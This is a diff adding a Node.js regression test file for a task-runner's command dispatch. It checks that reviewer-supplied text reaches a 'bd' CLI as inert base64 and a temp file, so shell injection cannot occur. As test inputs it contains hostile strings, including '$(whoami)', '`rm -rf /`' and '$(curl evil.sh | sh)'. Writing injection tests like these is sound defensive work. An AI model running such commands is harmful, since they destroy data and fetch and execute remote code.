@@ -1,0 +1,396 @@
+import { test, describe } from 'node:test';
+import assert from 'node:assert';
+import fs from 'fs/promises';
+import os from 'os';
+import path from 'path';
+import { spawnSync } from 'node:child_process';
+import { validateNewTask, createChildBeadWithAllocatedId, appendRejectedFindingToParentNotes } from '../fleet-sprint/runner.js';
+
+// apra-fleet-eft.56.2, transport hardened for eft.73.1: regression pin for the
+// reviewer-free-text body seam (createChildBeadWithAllocatedId /
+// appendRejectedFindingToParentNotes). eft.73.1 moved the body FILE from the
+// orchestrator host (an in-process fs.writeFile to os.tmpdir()) to the MEMBER
+// that runs `bd`, by dispatching a `node -e "..." "<base64>"` staging command
+// through the SAME injected command() the bd call flows through (see
+// stageCommandBodyMemberSide in runner.js). Run 22 aborted precisely because
+// the old host-local path was unreachable when `bd` ran on a remote member.
+//
+// This file drives the two functions directly with an injected command() fake
+// that EMULATES the member: when it sees the `node -e ... "<base64>"` staging
+// command, it decodes the base64 argument and writes it to a real temp file
+// (exactly as the member-side node one-liner would), returning that path on
+// stdout; when it later sees the `bd create --body-file "<path>"` /
+// `bd note ... --file "<path>"` command, it reads that file back. That lets it
+// assert, byte-for-byte:
+//   (1) a description containing '=' and '&' round-trips intact through the
+//       member-staged body file handed to `bd create --body-file`;
+//   (2) a newTask that still fails validateNewTask() residually is appended
+//       VERBATIM to the parent bead's notes (never dropped), and the caller-
+//       supplied log() records it;
+//   (3) a description containing '$(rm -rf /)' and backticks lands as
+//       LITERAL TEXT in the staged file, and NEITHER dispatched command STRING
+//       (the node staging command NOR the bd command) ever contains the raw
+//       payload -- the staging command carries it only as inert base64, and
+//       the bd command carries only the quoted temp-file path -- so there is
+//       no shell-string interpolation surface for it to execute through.
+
+function extractQuotedFlagValue(cmd, flag) {
+    const re = new RegExp(`${flag}\\s+"([^"]*)"`);
+    const m = cmd.match(re);
+    return m ? m[1] : null;
+}
+
+// Matches the staging command runner.js constructs:
+//   node -e "<script>" "<base64>"
+// Capture the base64 argument (the LAST double-quoted token).
+function extractStageBase64(cmd) {
+    if (!/^node -e "/.test(cmd)) return null;
+    const m = cmd.match(/"([A-Za-z0-9+/=]*)"\s*$/);
+    return m ? m[1] : null;
+}
+
+// A command() fake that plays the member's role: it stages base64 bodies to
+// real temp files (returning the path) and reads --body-file/--file back.
+function makeMemberEmulatingCommand() {
+    const calls = [];
+    const stagedPaths = [];
+    const command = async (cmd, opts) => {
+        calls.push({ cmd, opts });
+        const b64 = extractStageBase64(cmd);
+        if (b64 !== null) {
+            // Emulate the member-side node one-liner: decode + write + print path.
+            const content = Buffer.from(b64, 'base64').toString('utf-8');
+            const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'roundtrip-'));
+            const filePath = path.join(dir, 'body.txt');
+            await fs.writeFile(filePath, content, 'utf-8');
+            stagedPaths.push(filePath);
+            return filePath;
+        }
+        return '';
+    };
+    // Read back whatever a given bd command's --body-file/--file points at.
+    const readBodyOf = async (cmd) => {
+        const p = extractQuotedFlagValue(cmd, '--body-file') ?? extractQuotedFlagValue(cmd, '--file');
+        return p ? fs.readFile(p, 'utf-8') : null;
+    };
+    return { command, calls, stagedPaths, readBodyOf };
+}
+
+const NOOP_ALLOCATOR = {
+    async allocate() { return { childId: null, token: null }; },
+    async confirm() { return true; },
+    async release() { return true; },
+};
+
+// apra-fleet-j918.6.4: every test above emulates the member by extracting the
+// base64 argument straight out of the `node -e ...` command STRING (see
+// extractStageBase64) and decoding it in-process -- the emitted command is
+// never actually handed to a shell. That leaves the real quoting contract
+// (CLAUDE.md: a member-bound command string must not rely on shell-level
+// `$`-expansion, since the member's shell may be PowerShell, not POSIX)
+// unverified. This closes that gap for the POSIX shell family: a real bash
+// on PATH is required (gated below, matching test/se-os-commands-shell-
+// matrix.test.mjs's degrade-loudly convention) to actually run the emitted
+// command and read back what it really wrote to disk.
+const BASH_AVAILABLE = spawnSync('bash', ['-c', 'echo ok'], { encoding: 'utf8' }).status === 0;
+const BASH_SKIP = BASH_AVAILABLE
+    ? false
+    : 'DEGRADED: no bash on PATH, so the emitted node -e staging command cannot be round-tripped through a real POSIX shell on this host.';
+
+describe('createChildBeadWithAllocatedId / appendRejectedFindingToParentNotes -- member-staged body round-trip (apra-fleet-eft.56.2 / eft.73.1)', () => {
+    test("description with '=' and '&' round-trips intact via member-staged --body-file", async () => {
+        const description = 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.';
+        const { command, calls, stagedPaths, readBodyOf } = makeMemberEmulatingCommand();
+
+        const result = await createChildBeadWithAllocatedId({
+            command,
+            allocator: NOOP_ALLOCATOR,
+            member: 'local',
+            title: 'Fix env-var handling',
+            description,
+            priority: 'P1',
+            parentId: 'parent-1',
+        });
+
+        // Two dispatches now: (1) member-side node staging, (2) bd create.
+        assert.strictEqual(calls.length, 2, 'expected a member-side staging dispatch then a bd create dispatch');
+        const stageCmd = calls[0].cmd;
+        const createCmd = calls[1].cmd;
+
+        assert.match(stageCmd, /^node -e "/, 'first dispatch must stage the body member-side via node');
+        assert.ok(!stageCmd.includes('APRA_FLEET_BD_MOCK=off'), 'the raw description must never appear literally in the staging command; only its base64 does');
+
+        assert.match(createCmd, /^bd create /);
+        assert.match(createCmd, /--body-file "/, 'description must be passed via --body-file, not inline');
+        assert.ok(!createCmd.includes('APRA_FLEET_BD_MOCK=off'), 'description text must never be interpolated inline into the bd command string');
+        // apra-fleet-mrj: the null-allocator path (no explicit id granted) must
+        // let bd derive the id via --parent, and must NOT carry --id -- the
+        // mirror image of the explicit-id path below, which carries --id only
+        // and links the parent edge with a separate `bd update --parent`.
+        assert.match(createCmd, /--parent parent-1(\s|$)/, 'the null-allocator path must carry --parent so bd derives the id');
+        assert.ok(!createCmd.includes('--id '), `the null-allocator path must NOT carry --id: ${createCmd}`);
+        // The staged file the bd command was handed must contain the
+        // description VERBATIM, '=' and '&' intact.
+        assert.strictEqual(await readBodyOf(createCmd), description);
+        assert.strictEqual(result.childId, null);
+        // The path the bd command references must be exactly the one the
+        // member-side staging command returned -- proving the body file's
+        // provenance is the member, not an in-process orchestrator write.
+        assert.strictEqual(extractQuotedFlagValue(createCmd, '--body-file'), stagedPaths[0]);
+    });
+
+    test('a residual validation failure is appended verbatim to the parent bead notes and logged', async () => {
+        // A title that fails SAFE_TEXT_RE ($(...) command substitution --
+        // unlike a backtick, this is NOT sanitized, see apra-fleet-vk0a) --
+        // validateNewTask() rejects it, so this newTask must never reach
+        // createChildBeadWithAllocatedId at all; instead it is appended
+        // verbatim to the parent's notes.
+        const newTask = {
+            title: 'Run $(whoami) and report',
+            description: 'Safe-looking description with = and & chars intact.',
+            priority: 'P1',
+        };
+        const validation = validateNewTask(newTask);
+        assert.strictEqual(validation.ok, false);
+        assert.match(validation.reason, /title/);
+
+        const { command, calls, readBodyOf } = makeMemberEmulatingCommand();
+        const logLines = [];
+        const log = (msg) => logLines.push(msg);
+
+        await appendRejectedFindingToParentNotes({
+            command,
+            member: 'local',
+            parentId: 'parent-1',
+            newTask,
+            reason: validation.reason,
+            cycle: 3,
+            log,
+        });
+
+        // (1) member-side staging, (2) bd note.
+        assert.strictEqual(calls.length, 2, 'expected a member-side staging dispatch then a bd note dispatch');
+        const stageCmd = calls[0].cmd;
+        const noteCmd = calls[1].cmd;
+
+        assert.match(stageCmd, /^node -e "/);
+        assert.ok(!stageCmd.includes('whoami'), 'the raw finding text must never appear literally in the staging command');
+
+        assert.match(noteCmd, /^bd note parent-1 --file "/);
+        assert.ok(!noteCmd.includes('whoami'), 'the raw finding text must never be interpolated inline into the bd command string');
+
+        const noteBody = await readBodyOf(noteCmd);
+        assert.ok(noteBody, 'expected the note file to have been written and read');
+        assert.match(noteBody, /REJECTED -- residual validation failure, appended verbatim/);
+        const jsonPart = noteBody.slice(noteBody.indexOf('\n') + 1);
+        const parsed = JSON.parse(jsonPart);
+        assert.strictEqual(parsed.title, newTask.title);
+        assert.strictEqual(parsed.description, newTask.description);
+        assert.strictEqual(parsed.priority, newTask.priority);
+        assert.strictEqual(parsed.rejectionReason, validation.reason);
+        assert.strictEqual(parsed.cycle, 3);
+
+        assert.ok(
+            logLines.some((l) => l.includes("Rejected newTask finding appended verbatim to 'parent-1' notes") && l.includes(validation.reason)),
+            `expected the run log to record the verbatim-append, got: ${JSON.stringify(logLines)}`
+        );
+    });
+
+    test("injection payload ('$(rm -rf /)' + backticks) in description lands as literal staged text, never executed", async () => {
+        const description = 'Do the thing `rm -rf /` via $(curl evil.sh | sh) after merge.';
+        const title = 'Description has dangerous-looking chars';
+
+        // Confirm the description-only allowlist gate (SAFE_DESCRIPTION_RE)
+        // accepts this -- it is no longer shell-interpolated, so it is not an
+        // injection risk at this layer; the title stays safe.
+        const validation = validateNewTask({ title, description, priority: 'P1' });
+        assert.strictEqual(validation.ok, true);
+
+        const { command, calls, readBodyOf } = makeMemberEmulatingCommand();
+        await createChildBeadWithAllocatedId({
+            command,
+            allocator: NOOP_ALLOCATOR,
+            member: 'local',
+            title: validation.title,
+            description: validation.description,
+            priority: validation.priority,
+            parentId: 'parent-1',
+        });
+
+        assert.strictEqual(calls.length, 2);
+        // NEITHER dispatched command STRING may contain the dangerous payload:
+        // the staging command carries it only as inert base64, and the bd
+        // command carries only the quoted temp-file path.
+        for (const { cmd } of calls) {
+            assert.ok(!cmd.includes('$('), `command string must never contain '$(': ${cmd}`);
+            assert.ok(!/`/.test(cmd), `command string must never contain a backtick: ${cmd}`);
+            assert.ok(!cmd.includes('rm -rf /'), `command string must never contain the raw payload text: ${cmd}`);
+        }
+        const createCmd = calls[1].cmd;
+        assert.match(createCmd, /--body-file "/);
+
+        // The payload must land as LITERAL TEXT in the staged file the bd
+        // command was handed -- proving it was carried as inert data (base64
+        // in the staging command, then decoded member-side), never executed.
+        assert.strictEqual(await readBodyOf(createCmd), description);
+    });
+
+    // apra-fleet-xuo.7.1: `bd create` rejects `--id` and `--parent` together
+    // ("Error: cannot specify both --id and --parent flags"), so the
+    // allocator-minted explicit-id path must carry ONLY `--id` on the create
+    // (the `<parentId>.<seq>` id encodes the hierarchy) and then record the
+    // real parent edge with a separate `bd update --parent`. Issuing both
+    // flags on one create failed every reviewer newTask and left zero child
+    // beads under the shared parent while the sprint still reported success.
+    test('an allocator-granted explicit child id creates with --id only, then links the parent edge, then confirms', async () => {
+        const { command, calls } = makeMemberEmulatingCommand();
+        const allocatorCalls = [];
+        const grantingAllocator = {
+            async allocate(parentId, opts) {
+                allocatorCalls.push({ fn: 'allocate', parentId, opts });
+                return { childId: 'parent-1.3', token: 'tok-1' };
+            },
+            async confirm(token) { allocatorCalls.push({ fn: 'confirm', token }); return true; },
+            async release(token) { allocatorCalls.push({ fn: 'release', token }); return true; },
+        };
+
+        const result = await createChildBeadWithAllocatedId({
+            command,
+            allocator: grantingAllocator,
+            member: 'local',
+            title: 'Follow-up task',
+            description: 'A reviewer-proposed follow-up.',
+            priority: 'P2',
+            parentId: 'parent-1',
+        });
+
+        assert.strictEqual(result.childId, 'parent-1.3');
+        // Four dispatches: the explicit-id collision probe (bd show), member-side
+        // staging, bd create, bd update (link).
+        assert.strictEqual(calls.length, 4, `expected collision-probe + staging + create + parent-link dispatches, got ${JSON.stringify(calls.map((c) => c.cmd))}`);
+        const probeCmd = calls[0].cmd;
+        assert.strictEqual(probeCmd, 'bd show parent-1.3 --json', 'the explicit-id path must probe for a pre-existing bead before creating');
+        const createCmd = calls[2].cmd;
+        assert.match(createCmd, /^bd create /);
+        assert.match(createCmd, /--id parent-1\.3(\s|$)/, 'the create must carry the allocator-minted explicit id');
+        assert.ok(!createCmd.includes('--parent'), `the create must NOT carry --parent alongside --id: ${createCmd}`);
+        const linkCmd = calls[3].cmd;
+        assert.strictEqual(linkCmd, 'bd update parent-1.3 --parent parent-1', 'the explicit parent edge must be recorded by a separate bd update');
+
+        assert.deepStrictEqual(
+            allocatorCalls.map((c) => c.fn),
+            ['allocate', 'confirm'],
+            'a successful create+link must confirm the reservation and never release it',
+        );
+    });
+
+    // The parent edge is NOT best-effort: if the link dispatch fails, the `bd
+    // create` has ALREADY landed, so the reservation is CONFIRMED -- never
+    // released, since releasing an id that is genuinely occupied would hand
+    // it back out and collide on the next allocation (apra-fleet-btj9.2) --
+    // and a distinct, orphan-naming error propagates (persistNewTaskBestEffort
+    // then degrades to parent-bead notes) rather than silently leaving a child
+    // that `bd show` records no PARENT for.
+    test('a failing parent-link dispatch confirms the reservation (never releases) and rethrows a distinct orphan error', async () => {
+        const calls = [];
+        const command = async (cmd) => {
+            calls.push(cmd);
+            if (/^node -e "/.test(cmd)) return path.join(os.tmpdir(), 'body-does-not-matter.txt');
+            if (cmd.startsWith('bd update ')) throw new Error('simulated link failure');
+            return '';
+        };
+        const allocatorCalls = [];
+        const grantingAllocator = {
+            async allocate() { return { childId: 'parent-1.4', token: 'tok-2' }; },
+            async confirm(token) { allocatorCalls.push({ fn: 'confirm', token }); return true; },
+            async release(token) { allocatorCalls.push({ fn: 'release', token }); return true; },
+        };
+
+        await assert.rejects(
+            () => createChildBeadWithAllocatedId({
+                command,
+                allocator: grantingAllocator,
+                member: 'local',
+                title: 'Follow-up task',
+                description: 'A reviewer-proposed follow-up.',
+                priority: 'P2',
+                parentId: 'parent-1',
+            }),
+            /child bead 'parent-1\.4' was created but is UNLINKED/,
+        );
+        assert.deepStrictEqual(allocatorCalls.map((c) => c.fn), ['confirm'], 'a failed link must confirm (the create genuinely landed), never release');
+    });
+
+    // Defense in depth: an allocated id that does not sit under the requested
+    // parent can no longer be rescued by a `--parent` flag on the create, so it
+    // must be refused loudly instead of creating an unparented bead.
+    test('an allocated id outside the parent namespace is refused and released', async () => {
+        const calls = [];
+        const command = async (cmd) => { calls.push(cmd); return ''; };
+        const allocatorCalls = [];
+        const roqueAllocator = {
+            async allocate() { return { childId: 'somewhere-else.1', token: 'tok-3' }; },
+            async confirm(token) { allocatorCalls.push({ fn: 'confirm', token }); return true; },
+            async release(token) { allocatorCalls.push({ fn: 'release', token }); return true; },
+        };
+
+        await assert.rejects(
+            () => createChildBeadWithAllocatedId({
+                command,
+                allocator: roqueAllocator,
+                member: 'local',
+                title: 'Follow-up task',
+                description: 'A reviewer-proposed follow-up.',
+                priority: 'P2',
+                parentId: 'parent-1',
+            }),
+            /is not a child of parent/,
+        );
+        assert.deepStrictEqual(calls, [], 'no bd command may be dispatched for an out-of-namespace id');
+        assert.deepStrictEqual(allocatorCalls.map((c) => c.fn), ['release']);
+    });
+
+    test('real shell: the member-side node -e staging command actually executes under bash and byte-exact round-trips spaces/double-quotes/$/backtick', { skip: BASH_SKIP }, async () => {
+        const payload = 'Payload has spaces, "double quotes", a $DOLLAR sign, and a `backtick` mark.';
+        // Redirect the CHILD node process's os.tmpdir() into a sandbox this
+        // test owns and tears down, so the staged file never lands outside
+        // the test sandbox even though stageCommandBodyMemberSide hardcodes
+        // os.tmpdir() internally.
+        const sandbox = await fs.mkdtemp(path.join(os.tmpdir(), 'stage-realshell-'));
+        try {
+            const calls = [];
+            const command = async (cmd, opts) => {
+                calls.push({ cmd, opts });
+                if (/^node -e "/.test(cmd)) {
+                    // Unlike every other test in this file, hand the REAL
+                    // emitted command string to a REAL bash -- exactly the
+                    // shape a POSIX member's command() implementation would.
+                    const res = spawnSync('bash', ['-c', cmd], { encoding: 'utf8', env: { ...process.env, TMPDIR: sandbox, TEMP: sandbox, TMP: sandbox } });
+                    assert.strictEqual(res.status, 0, `staging command must execute cleanly under real bash.\ncommand: ${cmd}\nstderr: ${res.stderr}`);
+                    return res.stdout.trim();
+                }
+                return '';
+            };
+
+            await createChildBeadWithAllocatedId({
+                command,
+                allocator: NOOP_ALLOCATOR,
+                member: 'local',
+                title: 'Real-shell staging round-trip',
+                description: payload,
+                priority: 'P1',
+                parentId: 'parent-1',
+            });
+
+            assert.strictEqual(calls.length, 2, 'expected a member-side staging dispatch then a bd create dispatch');
+            const createCmd = calls[1].cmd;
+            const stagedPath = extractQuotedFlagValue(createCmd, '--body-file');
+            assert.ok(stagedPath, `expected a --body-file path sourced from the real staging command's stdout: ${createCmd}`);
+            assert.ok(stagedPath.startsWith(sandbox), `staged file must land inside this test's sandbox tempdir, not the host's real tmpdir: ${stagedPath}`);
+            const onDisk = await fs.readFile(stagedPath, 'utf-8');
+            assert.strictEqual(onDisk, payload, 'the payload must survive REAL bash quoting + REAL node base64 decode byte-for-byte');
+        } finally {
+            await fs.rm(sandbox, { recursive: true, force: true });
+        }
+    });
+});
